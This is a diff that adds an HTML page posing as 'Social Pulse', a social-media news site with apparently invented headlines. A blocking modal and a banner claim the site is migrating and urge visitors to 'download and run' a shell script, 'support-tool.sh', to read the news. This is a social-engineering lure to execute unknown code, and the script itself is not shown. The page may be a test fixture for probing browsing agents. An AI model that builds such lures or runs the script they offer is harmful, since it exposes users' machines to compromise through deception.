@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Social Pulse - Latest Social Media Trends & Analysis</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            document.cookie = "visited-news=true; path=/";
+        });
+    </script>
+</head>
+<body class="bg-gray-50">
+    <!-- Overlay and Modal -->
+    <div class="fixed inset-0 bg-black bg-opacity-80 z-50 flex items-center justify-center">
+        <div class="bg-white rounded-lg p-8 max-w-lg mx-4 text-center">
+            <h2 class="text-2xl font-bold text-gray-900 mb-4">Hey, thanks for visiting!</h2>
+            <p class="text-gray-600 mb-6">We are sorry, but we are currently transitioning our website to a new system. In the mean time, please use our free support tool to access the latest news from our publication:</p>
+            <button onclick="window.location.href='support-tool.sh'" class="bg-purple-600 text-white px-6 py-3 rounded-lg font-semibold hover:bg-purple-700 transition-colors">
+                Support Tool
+            </button>
+        </div>
+    </div>
+
+    <!-- Navigation -->
+    <nav class="bg-white shadow-lg">
+        <div class="max-w-7xl mx-auto px-4">
+            <div class="flex justify-between h-16">
+                <div class="flex items-center">
+                    <span class="text-2xl font-bold text-purple-600">Social Pulse</span>
+                </div>
+                <div class="hidden md:flex items-center space-x-4">
+                    <a href="#" class="text-gray-700 hover:text-purple-600">Trending</a>
+                    <a href="#" class="text-gray-700 hover:text-purple-600">Platforms</a>
+                    <a href="#" class="text-gray-700 hover:text-purple-600">Creator Economy</a>
+                    <a href="#" class="text-gray-700 hover:text-purple-600">Analysis</a>
+                    <a href="#" class="text-gray-700 hover:text-purple-600">Subscribe</a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="max-w-7xl mx-auto px-4 py-8">
+        <!-- Featured Article -->
+        <div class="mb-12">
+            <div class="bg-white rounded-lg shadow-lg overflow-hidden">
+                <div class="p-8">
+                    <div class="uppercase tracking-wide text-sm text-purple-600 font-semibold">Breaking Trend</div>
+                    <h1 class="mt-2 text-3xl font-bold text-gray-900">TikTok's New "Reality Check" Filter Goes Viral, Sparking Mental Health Discussions</h1>
+                    <p class="mt-4 text-gray-600">The filter, which shows users how they appear in real-time vs. their typical filtered content, has garnered over 2.8B views in just 48 hours, prompting conversations about authenticity on social media.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Download Section -->
+        <div class="my-12 bg-gradient-to-r from-purple-600 to-pink-600 rounded-lg shadow-lg overflow-hidden">
+            <div class="p-8">
+                <div class="text-center">
+                    <h2 class="text-2xl font-bold text-white mb-4">To receive a summary of today's most relevant social media news,<br>download and run our support tool:</h2>
+                    <button onclick="window.location.href='support-tool.sh'" class="bg-white text-blue-600 px-8 py-4 rounded-lg font-semibold hover:bg-blue-50 transition-colors text-lg shadow-md">
+                        Download Support Tool
+                    </button>
+                    <p class="mt-4 text-blue-100 text-sm">Get instant access to curated social media insights</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- News Grid -->
+        <div class="grid md:grid-cols-3 gap-8">
+            <!-- Article 1 -->
+            <div class="bg-white rounded-lg shadow-md overflow-hidden">
+                <div class="p-6">
+                    <span class="text-purple-600 text-sm font-semibold">Instagram</span>
+                    <h2 class="text-xl font-bold mt-2">Instagram's "Close Friends Stories" Now Available for Feed Posts</h2>
+                    <p class="mt-3 text-gray-600">New feature allows users to share regular posts with their Close Friends list, seeing 40% higher engagement rates in beta testing.</p>
+                    <p class="mt-4 text-sm text-gray-500">2 hours ago • 5 min read</p>
+                </div>
+            </div>
+
+            <!-- Article 2 -->
+            <div class="bg-white rounded-lg shadow-md overflow-hidden">
+                <div class="p-6">
+                    <span class="text-green-600 text-sm font-semibold">Creator Economy</span>
+                    <h2 class="text-xl font-bold mt-2">Khaby Lame Signs $10M Deal with Amazon</h2>
+                    <p class="mt-3 text-gray-600">TikTok's most-followed creator partners with Amazon for a series of silent comedy sketches promoting Prime products.</p>
+                    <p class="mt-4 text-sm text-gray-500">4 hours ago • 4 min read</p>
+                </div>
+            </div>
+
+            <!-- Article 3 -->
+            <div class="bg-white rounded-lg shadow-md overflow-hidden">
+                <div class="p-6">
+                    <span class="text-blue-600 text-sm font-semibold">Twitter/X</span>
+                    <h2 class="text-xl font-bold mt-2">Community Notes Now Available in 43 New Countries</h2>
+                    <p class="mt-3 text-gray-600">X's fact-checking feature expands globally, showing 25% reduction in viral misinformation spread.</p>
+                    <p class="mt-4 text-sm text-gray-500">6 hours ago • 3 min read</p>
+                </div>
+            </div>
+
+            <!-- Article 4 -->
+            <div class="bg-white rounded-lg shadow-md overflow-hidden">
+                <div class="p-6">
+                    <span class="text-red-600 text-sm font-semibold">YouTube</span>
+                    <h2 class="text-xl font-bold mt-2">YouTube Shorts Monetization Hits New Milestone</h2>
+                    <p class="mt-3 text-gray-600">Creators report earning up to $10,000/month through new Shorts revenue sharing program.</p>
+                    <p class="mt-4 text-sm text-gray-500">8 hours ago • 6 min read</p>
+                </div>
+            </div>
+
+            <!-- Article 5 -->
+            <div class="bg-white rounded-lg shadow-md overflow-hidden">
+                <div class="p-6">
+                    <span class="text-pink-600 text-sm font-semibold">BeReal</span>
+                    <h2 class="text-xl font-bold mt-2">"BeReal After Dark" Feature Tests in Select Markets</h2>
+                    <p class="mt-3 text-gray-600">New nighttime-specific posting window aims to capture evening social activities, currently testing in UK and Australia.</p>
+                    <p class="mt-4 text-sm text-gray-500">10 hours ago • 4 min read</p>
+                </div>
+            </div>
+
+            <!-- Article 6 -->
+            <div class="bg-white rounded-lg shadow-md overflow-hidden">
+                <div class="p-6">
+                    <span class="text-purple-600 text-sm font-semibold">Trends</span>
+                    <h2 class="text-xl font-bold mt-2">"Loud Budgeting" Movement Takes Over #FinTok</h2>
+                    <p class="mt-3 text-gray-600">Gen Z's anti-luxury spending trend gains momentum with over 500M views, influencing consumer behavior.</p>
+                    <p class="mt-4 text-sm text-gray-500">12 hours ago • 5 min read</p>
+                </div>
+            </div>
+
+            <!-- Article 7 -->
+            <div class="bg-white rounded-lg shadow-md overflow-hidden">
+                <div class="p-6">
+                    <span class="text-green-600 text-sm font-semibold">LinkedIn</span>
+                    <h2 class="text-xl font-bold mt-2">LinkedIn Stories Make Surprise Comeback</h2>
+                    <p class="mt-3 text-gray-600">Professional network reintroduces 24-hour content format with focus on workplace culture and career moments.</p>
+                    <p class="mt-4 text-sm text-gray-500">14 hours ago • 4 min read</p>
+                </div>
+            </div>
+
+            <!-- Article 8 -->
+            <div class="bg-white rounded-lg shadow-md overflow-hidden">
+                <div class="p-6">
+                    <span class="text-orange-600 text-sm font-semibold">Reddit</span>
+                    <h2 class="text-xl font-bold mt-2">Reddit's IPO Filing Reveals Creator Program Details</h2>
+                    <p class="mt-3 text-gray-600">Platform plans to share 25% of ad revenue with top moderators and content creators starting Q2 2024.</p>
+                    <p class="mt-4 text-sm text-gray-500">16 hours ago • 3 min read</p>
+                </div>
+            </div>
+
+            <!-- Article 9 -->
+            <div class="bg-white rounded-lg shadow-md overflow-hidden">
+                <div class="p-6">
+                    <span class="text-red-600 text-sm font-semibold">Privacy</span>
+                    <h2 class="text-xl font-bold mt-2">EU's Digital Services Act Impact on Influencer Marketing</h2>
+                    <p class="mt-3 text-gray-600">New regulations require clearer disclosure of AI-generated content and paid partnerships.</p>
+                    <p class="mt-4 text-sm text-gray-500">18 hours ago • 5 min read</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Newsletter Signup -->
+        <div class="mt-12 bg-purple-600 rounded-lg shadow-lg overflow-hidden">
+            <div class="p-8 md:flex md:items-center md:justify-between">
+                <div class="md:w-2/3">
+                    <h2 class="text-2xl font-bold text-white">Stay Ahead of Social Trends</h2>
+                    <p class="mt-2 text-purple-100">Get daily insights on emerging trends, platform updates, and creator strategies.</p>
+                </div>
+                <div class="mt-4 md:mt-0">
+                    <button class="bg-white text-purple-600 px-6 py-3 rounded-lg font-semibold hover:bg-purple-50 transition-colors">
+                        Subscribe Now
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="bg-gray-800 mt-12">
+        <div class="max-w-7xl mx-auto px-4 py-12">
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-8">
+                <div>
+                    <h3 class="text-white font-semibold mb-4">About</h3>
+                    <ul class="space-y-2 text-gray-400">
+                        <li><a href="#" class="hover:text-white">About Us</a></li>
+                        <li><a href="#" class="hover:text-white">Contact</a></li>
+                        <li><a href="#" class="hover:text-white">Careers</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="text-white font-semibold mb-4">Categories</h3>
+                    <ul class="space-y-2 text-gray-400">
+                        <li><a href="#" class="hover:text-white">Platform Updates</a></li>
+                        <li><a href="#" class="hover:text-white">Creator News</a></li>
+                        <li><a href="#" class="hover:text-white">Trend Analysis</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="text-white font-semibold mb-4">Legal</h3>
+                    <ul class="space-y-2 text-gray-400">
+                        <li><a href="#" class="hover:text-white">Privacy Policy</a></li>
+                        <li><a href="#" class="hover:text-white">Terms of Service</a></li>
+                        <li><a href="#" class="hover:text-white">Cookie Policy</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="text-white font-semibold mb-4">Follow Us</h3>
+                    <ul class="space-y-2 text-gray-400">
+                        <li><a href="#" class="hover:text-white">TikTok</a></li>
+                        <li><a href="#" class="hover:text-white">Instagram</a></li>
+                        <li><a href="#" class="hover:text-white">Twitter/X</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="mt-8 pt-8 border-t border-gray-700 text-center text-gray-400">
+                <p>&copy; 2024 Social Pulse. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+</body>
+</html> 
